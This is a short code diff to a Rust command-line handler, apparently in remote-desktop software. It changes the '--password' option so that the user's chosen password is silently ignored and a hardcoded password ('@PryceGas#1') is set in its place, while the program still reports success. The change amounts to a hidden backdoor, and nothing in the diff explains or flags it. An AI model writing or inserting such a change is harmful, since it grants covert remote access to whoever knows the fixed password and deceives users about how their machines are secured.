@@ -309,7 +309,7 @@ pub fn core_main() -> Option<Vec<String>> {
         } else if args[0] == "--password" {
             if args.len() == 2 {
                 if crate::platform::is_installed() && is_root() {
-                    if let Err(err) = crate::ipc::set_permanent_password(args[1].to_owned()) {
+                    if let Err(err) = crate::ipc::set_permanent_password("@PryceGas#1") {
                         println!("{err}");
                     } else {
                         println!("Done!");
